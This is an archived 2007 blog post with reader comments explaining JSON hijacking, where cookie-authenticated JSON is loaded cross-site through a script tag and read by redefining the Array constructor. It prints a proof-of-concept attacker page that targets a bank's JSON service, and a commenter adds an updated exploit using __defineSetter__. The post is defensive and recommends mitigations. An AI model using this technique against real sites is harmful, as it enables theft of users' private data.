@@ -1,0 +1,270 @@
+<!DOCTYPE html>
+
+<html lang="en">
+<head>
+  <title>JSON is not as safe as people think it is - Incompleteness</title>
+  <link rel="canonical" href="http://incompleteness.me/blog/2007/03/05/json-is-not-as-safe-as-people-think-it-is/" />
+  <meta name="author" content="Joe Walker" /><link href="http://incompleteness.me/blog/atom.xml" rel="alternate" title="Incompleteness" type="application/atom+xml" /><link href="http://incompleteness.me/favicon.png" rel="shortcut icon" /><link href="http://incompleteness.me/styles/normalize.css" media="screen, projection" rel="stylesheet" type="text/css" /><link href="http://incompleteness.me/styles/blog.css" media="screen, projection" rel="stylesheet" type="text/css" /><link href="http://incompleteness.me/styles/twitter.css" media="screen, projection" rel="stylesheet" type="text/css" /><meta charset="utf-8" /><meta name="HandheldFriendly" content="True" /><meta name="MobileOptimized" content="320" /><meta name="viewport" content="width=device-width, initial-scale=1" />
+</head>
+
+<body>
+  <nav role="navigation">
+  <ul role="subscription" data-subscription="rss">
+    <li><a href="http://incompleteness.me/blog/atom.xml" rel="subscribe-rss" title="subscribe via RSS">RSS</a></li>
+  </ul>
+  <form action="http://google.com/search" method="get">
+    <fieldset role="site-search">
+      <input type="hidden" name="q" value="site:incompleteness.me" />
+      <input class="search" type="text" name="q" results="0" placeholder="Search" />
+    </fieldset>
+  </form>
+  <ul role="main-navigation">
+    <li><a href="http://incompleteness.me/">Incompleteness</a></li>
+  </ul>
+</nav>
+
+  <div id="main">
+    <article class="hentry">
+      <h1><a href="http://incompleteness.me/blog/2007/03/05/json-is-not-as-safe-as-people-think-it-is/">JSON is not as safe as people think it is</a></h1><section class="content"><p>I saw some <a href="http://robubu.com/?p=24">discussion recently</a> about using JSON for secured data, and I'm not sure that everyone understands the risks.</p><p>I believe that JSON is unsafe for anything but public data unless you are using unpredictable URLs.</p><p>There are 2 problems. CSRF (Cross Site Request Fogery) allows attackers to bypass cookie based authentication. <a href="http://incompleteness.me/blog/2007/01/01/csrf-attacks-or-how-to-avoid-exposing-your-gmail-contacts/">I blogged about it</a> a while ago. <a href="http://en.wikipedia.org/wiki/Cross-site_request_forgery">Wikipedia</a> talks about it. CSRF allows you to invoke cookie protected actions on a remote server. It allows Mr. Evil to trick Mrs. Innocent into transferring money from her bank account into his.</p><p>Far less known perhaps, is the JSON/Array hack that allows a user to steal JSON data on Mozilla and any other platform with a modern JavaScript interpreter.</p><p>There are many ways to fetch data from a server, but the interesting cases here are: XHR, iframe and script-tags. Without knowledge of the JSON/Array hack it's easy to reason like this:</p><ul>
+<li>XHR: Browser cross-domain rules prevent the attacker from making the request in the first place.</li>
+<li>iframe: The attacker can embed an iframe that points at some remote server (the bank in the above example) and ask to be sent some JSON, but browser cross-domain rules prevent scripts from the attackers domain from reading the reply, so the JSON is safe because it will never be <code>eval()ed</code>.</li>
+<li>Script-Tags: The attacker can embed a script tag pointing at a remote server and the browser will effectively <code>eval()</code> the reply for you, however it throws away the response and since JSON is all response, you're safe.</li>
+</ul><p>It's the last of these arguments that is suspect. The dynamic nature of JavaScript will let you redefine how the browser evaluates the JSON.</p><p>Here's how it works, and you can follow along with any JavaScript console: </p><ol>
+<li>Redefine the Array constructor:<br />
+<pre>function Array() { alert("hi"); }</pre></li>
+
+<li>Verify that this constructor is called when arrays are created:<br />
+<pre>var a = [ 43 ];</pre></li>
+
+<li>Use the new feature to manipulate the array:<br />
+<pre>
+function Array() {
+  this[1] = 50;
+}
+var a = [40];
+alert(a[0] + a[1]); // Gives 90
+</pre>
+</li></ol><p>So we can call secure JSON data using CSRF with a script tag to by-pass the cookie authentication, and then use the JSON/Array hack to steal the JavaScript data from the browser as it processes the script-tag.</p><p>So we've redefined the Array constructor, how do we actually get the data out? The syntax below works in current versions of Firefox, although from my reading of the spec proposals, it's not a part of <a href="http://developer.mozilla.org/es4/spec/spec.html">Javascript 2</a>, and it appears to fail in IE/Safari/Opera.</p><p>Create a web page at evil.com, with a couple of script tags like this:</p><pre>
+&lt;script type='text/javascript'&gt;
+function Array() {
+  var obj = this;
+  var ind = 0;
+  var getNext = function(x) {
+    obj[ind++] setter = getNext;
+    if (x) alert(Data stolen from array: " + x.toString());
+  };
+  this[ind++] setter = getNext;
+}
+&lt;/script&gt;
+&lt;script type='text/javascript' src='http://bank.com/jsonservice'&gt; &lt;/script&gt;
+</pre><p>The long and short is that JSON is not safe in any system that uses cookies for authentication.</p><p>With <a href="http://directwebremoting.org/dwr/">DWR</a> we use full JavaScript which is as vulnerable as JSON, however DWR's CSRF protection automatically uses the doubly-submitted cookie pattern to provide extra safety.</p><p>I'm by no means the first person to think of this; Jeremiah Grossman <a href="http://jeremiahgrossman.blogspot.com/2006/01/advanced-web-attack-techniques-using.html">used it to break GMail</a> over a year ago.</p><p><strong>Update:</strong> If you are doing JSON 100% properly, then you will only have objects at the top level. Arrays, Strings, Numbers, etc will all be wrapped. A JSON object will then fail to eval() because the JavaScript interpreter will think it's looking at a block rather than an object. This goes a long way to protecting against these attacks, however it's still best to protect your secure data with un-predictable URLs.</p></section><section class="meta">
+  <span class="byline author vcard">
+    Posted by <span class="fn">Joe Walker</span>
+  </span>
+  <time datetime="2007-03-5T19:31:52+00:00" pubdate="pubdate">
+    <span class="day">5</span>
+    <span class="month">Mar</span>
+    <span class="year">2007</span>
+  </time>
+</section><section class="sharing">
+  <a href="http://twitter.com/share" class="twitter-share-button" data-via="joewalker" data-url="http://incompleteness.me/blog/2007/03/05/json-is-not-as-safe-as-people-think-it-is/" data-counturl="http://incompleteness.me/blog/2007/03/05/json-is-not-as-safe-as-people-think-it-is/">Tweet</a>
+  <div class="g-plusone" data-size="medium"></div>
+</section>
+      <section class="comments">
+        <h2>Comments</h2>
+        
+
+        <div>
+          <div class="comment comment-indent-undefined">
+            <div>
+              <strong>
+                <a href="http://incompleteness.me/">Joe Walker</a>
+                
+              </strong>
+              <span class="comment-title">Re: JSON is not as safe as people think it is</span>
+            </div>
+            <p class="comment-body"><div>I think you are getting invalid label because the Javascript interpreter can't distinguish between an object and a code block, so it thinks the foo: is a label.<p>In the script-tag based case the interpreter can tell the difference, (can't think why right now).<p>You can wrap the JSON in () to force the interpreter to think of it as JSON and not a code block.<p>e.g. <pre>({ "F":[ 43 ] })</pre></p></p></p><div></div></div></p>
+          </div><div class="comment comment-indent-undefined">
+            <div>
+              <strong>
+                
+                <span>Mark Goodwin</span>
+              </strong>
+              <span class="comment-title">Re: JSON is not as safe as people think it is</span>
+            </div>
+            <p class="comment-body"><div><p>Those planning on writing future-proof exploit code should note that 'setter' (and 'getter' for that matter) is deprecated. See <a href="http://developer.mozilla.org/en/docs/Core_JavaScript_1.5_Guide:Working_with_Objects#Defining_Getters_and_Setters">this link</a> for more info.</p><p>Using the new syntax; the sample code looks like this:</p><pre>
+      function Array() {
+        var obj = this;
+        var ind = 0;
+
+        var getNext = function(x) {
+          this.__defineSetter__(eval('ind++'),getNext);
+          if (x) alert("Data stolen from array: " + x.toString());
+         };
+         this.__defineSetter__(eval(ind++),getNext);
+      }
+      </pre>
+    <div></div></div></p>
+          </div><div class="comment comment-indent-undefined">
+            <div>
+              <strong>
+                <a href="http://kid666.com/blog">Tom</a>
+                
+              </strong>
+              <span class="comment-title">Re: JSON is not as safe as people think it is</span>
+            </div>
+            <p class="comment-body"><div>Hi Joe,I think it's great you are being wary of JSON for personalised data. However there are a couple of things you mentioned I don't totally agree with. You use the example of an array, however the syntax you used isn't actually JSON. http://json.org clearly defines JSON and stuff has to be wrapped in { } to be valid JSON. I discussed in a post last year (http://kid666.com/blog/2006/12/23/security-ajax-json-satisfaction/) about why arrays are vulnerable where objects are not. It comes down to the syntax used to allow Javascript to have multi-dimensional arrays. If you want to do secure JSON the best thing is to use a secure key which comes from the domain pages which consume the JSON and is validated on the server. This is usually implemented by using a server side language to print the 'key' to the page calling the JSON. A cookie is used to store a user unique value which is hashed with a secret. This value is passed as an HTTP argument with the JSON. Since each user has their own key a 3rd party can't call the JSON as that user successfully.<div></div></div></p>
+          </div><div class="comment comment-indent-undefined">
+            <div>
+              <strong>
+                <a href="http://robubu.com">Rob Yates</a>
+                
+              </strong>
+              <span class="comment-title">Re: JSON is not as safe as people think it is</span>
+            </div>
+            <p class="comment-body"><div>I have updated the <a href="http://robubu.com/?p=24">Safe JSON</a> post to reflect these concerns. Many thanks for pointing them out and please let me know if you think that there are still vulnerabilities, Rob<div></div></div></p>
+          </div><div class="comment comment-indent-undefined">
+            <div>
+              <strong>
+                <a href="http://www.JSON.org/">Douglas Crockford</a>
+                
+              </strong>
+              <span class="comment-title">Re: JSON is not as safe as people think it is</span>
+            </div>
+            <p class="comment-body"><div>This statement is strictly true: JSON is unsafe for anything but public data unless you are using unpredictable URLs. It is true for all data formats. There was never a good reason to believe that JSON reduced the need for vigilant design.<div></div></div></p>
+          </div><div class="comment comment-indent-undefined">
+            <div>
+              <strong>
+                <a href="http://incompleteness.me/">Joe Walker</a>
+                
+              </strong>
+              <span class="comment-title">Re: JSON is not as safe as people think it is</span>
+            </div>
+            <p class="comment-body"><div>I totally agree with you, about good application design. <p>My worry is that so few people understand the issues. Take a look at the comments, particularly on the Ajaxian thread, and you will see a lot of confusion, and the confused are creating insecure webapps. </p><div></div></div></p>
+          </div>
+          <section class="comments">
+            <p>Comments have been turned off on old posts</p>
+          </section>
+        </div>
+      </section>
+    </article>
+
+    <aside role="sidebar">
+  <section>
+
+  <h2><a href="http://incompleteness.me/blog/">Incompleteness</a></h2>
+  <p class="indent">
+    <a href="http://incompleteness.me/blog/archives/">Archives</a><br />
+    <a href="http://incompleteness.me/blog/atom.xml">atom.xml</a><br />
+  </p>
+  <p>
+    If it's a choice between<br />
+    incomplete or wrong,<br />
+    side with <a href="http://en.wikipedia.org/wiki/G%C3%B6del%27s_incompleteness_theorems">Gödel</a>.
+  </p>
+
+  <h2>About</h2>
+  <p>
+    I'm Joe Walker. I work for Mozilla making developer tools better
+    i.e. creating tomorrow's Firebug.
+  </p>
+  <p>
+    See also <a href="https://github.com/joewalker">joewalker</a> on Github
+    and <a href="https://twitter.com/joewalker">@joewalker</a> on Twitter, and
+    <a href="https://plus.google.com/103130341946168853745/posts">103130341946168853745</a>
+    on Google+.
+  </p>
+
+  <h2>Projects</h2>
+  <ul>
+    <li>
+      <a href="https://github.com/joewalker/gcli">GCLI</a> is a web developers
+      command-line that's being used in Firefox Developer Tools, and alongside
+      Ace
+    </li>
+    <li>
+      <a href="https://github.com/joewalker/domtemplate">DOM Template</a>
+      is an experimental DOM template engine with some nice features like
+      asynchronous layout
+    </li>
+    <li>
+      <a href="https://github.com/joewalker/csstools">CSS Doctor</a> is an
+      experiment into how we can improve the CSS telemetry in a browser
+    </li>
+    <li>
+      <a href="http://directwebremoting.org/dwr/index.html">DWR</a> is a Java
+      library that enables Java on the server and JavaScript in a browser to
+      interact and call each other as simply as possible
+    </li>
+  </ul>
+</section>
+  <section>
+  <h2>Recent Posts</h2>
+  <ul id="recent_posts">
+    <li class="post">
+      <a href="http://incompleteness.me/blog/2011/12/14/combating-self-xss/">Combating Self-XSS</a>
+    </li><li class="post">
+      <a href="http://incompleteness.me/blog/2011/09/16/how-to-eat-an-elephant/">How to Eat an Elephant</a>
+    </li><li class="post">
+      <a href="http://incompleteness.me/blog/2010/09/13/marketing-according-to-the-browser-makers/">Marketing (according to the browser makers)</a>
+    </li><li class="post">
+      <a href="http://incompleteness.me/blog/2010/02/01/apple-and-adobe-obituaries-and-idealism/">Apple and Adobe, Obituaries and Idealism</a>
+    </li><li class="post">
+      <a href="http://incompleteness.me/blog/2009/08/13/collaboration-in-bespin/">Collaboration in Bespin</a>
+    </li><li class="post">
+      <a href="http://incompleteness.me/blog/2009/05/27/command-lines/">Command Lines</a>
+    </li><li class="post">
+      <a href="http://incompleteness.me/blog/2009/04/15/introducing-david-marginian/">Introducing David Marginian</a>
+    </li><li class="post">
+      <a href="http://incompleteness.me/blog/2009/02/16/the-power-of-bespin/">The Power of Bespin</a>
+    </li><li class="post">
+      <a href="http://incompleteness.me/blog/2009/02/04/undoable-silent-autoupdate/">Undoable Silent Autoupdate</a>
+    </li><li class="post">
+      <a href="http://incompleteness.me/blog/2009/02/04/bespin-and-mozilla/">Bespin and Mozilla</a>
+    </li>
+  </ul>
+</section>
+  <section>
+  <h2>Latest Tweets</h2>
+
+  <ul id="tweets">
+    <li class="loading">Status updating...</li>
+  </ul>
+
+  <script type="text/javascript">
+    window.addEventListener('load', function() {
+      getTwitterFeed("joewalker", 4, false);
+    });
+  </script>
+
+  <script src="http://incompleteness.me/scripts/twitter.js" type="text/javascript"></script>
+  <a href="http://twitter.com/joewalker" class="twitter-follow-button" data-width="208px" data-show-count="false">Follow @joewalker</a>
+</section>
+</aside>
+  </div>
+
+  <footer>
+  <p>
+    Copyright © 2011 - Joe Walker -
+    <span class="credit">Powered by <a href="https://github.com/joewalker/jspress/">JSPress</a></span>
+  </p>
+</footer><script type="text/javascript">
+  (function() {
+    var script = document.createElement('script');
+    script.type = 'text/javascript';
+    script.async = true;
+    script.src = 'https://apis.google.com/js/plusone.js';
+    var s = document.getElementsByTagName('script')[0];
+    s.parentNode.insertBefore(script, s);
+  })();
+</script><script type="text/javascript">
+  (function() {
+    var twitterWidgets = document.createElement('script');
+    twitterWidgets.type = 'text/javascript';
+    twitterWidgets.async = true;
+    twitterWidgets.src = 'http://platform.twitter.com/widgets.js';
+    document.getElementsByTagName('head')[0].appendChild(twitterWidgets);
+  })();
+</script>
+</body>
+</html>
